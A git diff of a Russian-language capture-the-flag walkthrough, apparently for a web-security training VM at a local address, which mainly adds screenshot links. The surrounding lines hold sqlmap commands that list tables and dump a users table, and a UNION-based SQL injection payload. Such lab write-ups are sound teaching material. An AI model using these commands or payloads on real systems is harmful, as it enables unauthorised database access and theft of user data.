@@ -105,6 +105,9 @@ python3 bf_login.py
 	```bash
 	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
 	```
+	
+	<img width="581" alt="Screen Shot 2022-11-13 at 08 32 28" src="https://user-images.githubusercontent.com/84193980/201508174-f1d52c4f-63be-47d0-aa58-e2881de979d0.png">
+	
 	- Выведем дамп таблицы users:
 	```
 	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --dump -T users
@@ -212,6 +215,8 @@ lower all the char: fortytwo
 	```bash
 	python3 sqlmap.py -u http://192.168.56.3/index.php\?page\=member\&id\=1\&Submit\=Submit\# --tables
 	```
+	
+	<img width="581" alt="Screen Shot 2022-11-13 at 08 32 28" src="https://user-images.githubusercontent.com/84193980/201508174-f1d52c4f-63be-47d0-aa58-e2881de979d0.png">
 
 	Нас интересует таблица list_images
 
@@ -237,6 +242,7 @@ lower all the char: fortytwo
 	1 OR 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
 	```
 
+	<img width="1080" alt="Screen Shot 2022-11-13 at 08 45 05" src="https://user-images.githubusercontent.com/84193980/201508206-c0769387-7568-41ea-8410-47080f3b4df4.png">
 
 	В данных последней картинки находим:
 		Title: borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
@@ -247,7 +253,8 @@ lower all the char: fortytwo
 	```
 	./get_page-pic.sh
 	```
-	<img width="1560" alt="Screen Shot 2022-11-12 at 16 24 55" src="https://user-images.githubusercontent.com/84193980/201477797-c91bba96-6d18-4aab-81f4-6d212cff7c24.png">
+	
+	<img width="1011" alt="Screen Shot 2022-11-13 at 08 53 05" src="https://user-images.githubusercontent.com/84193980/201508219-a9de4b5f-89bd-49b0-bb29-21a4d41a4d54.png">
 
 - Нас интересует картинка, у которой "Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
 
